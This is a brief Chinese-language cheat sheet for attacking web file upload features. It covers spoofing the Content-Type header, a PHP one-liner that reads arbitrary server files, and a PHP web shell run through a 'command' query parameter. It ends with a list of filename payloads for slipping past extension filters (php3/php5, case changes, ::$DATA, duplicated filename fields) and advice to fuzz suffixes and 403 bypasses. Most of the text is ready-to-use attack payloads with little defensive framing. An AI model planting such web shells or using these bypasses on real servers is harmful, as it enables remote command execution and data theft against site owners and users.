# 文件上传

图片上传处可能存在文件上传，可根据上传的图片得到上传文件所在路径

某些文件上传只校验 `Content-Type` 标头是否与预期的 MIME 类型匹配，可以伪造

```
Content-Type: image/jpeg
```

以下 PHP 单行代码可用于从服务器的文件系统读取任意文件：

```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

上传后，发送对此恶意文件的请求将在响应中返回目标文件的内容。

更通用的 Web shell 可能如下所示：

```
<?php echo system($_GET['command']); ?>
```

该脚本使您能够通过查询参数传递任意系统命令，如下所示：

```
 GET /example/exploit.php?command=whoami HTTP/1.1
```

## 绕过

```
filename="shell.php"

filename="shell.php

filename=shell.php"

filename="shell.phhtml"

filename="shell.p
h
p"

filename="shell.php3"

filename="shell.php5"

filename="shell.php6"

filename="shell.php6";filename="shell.php6";

filename="xxxxxxxxxxxxxxxxxxxxxxxxxshell.php"

filename="shell.php::$DATA"(windows 专用)

filename="shell.pHP"

filename="shell.jpg";filename="shell.jpg";filename="shell.jpg";filename="shell.jpg";filename="shell.jpg";filename="shell.jpg";filename="shell.jpg";filename="shell.jpg";filename="shell.jpg";filename="shell.php";

```

可用 intruder 爆破后缀(fuzz)

403 bypass 也可以 fuzz
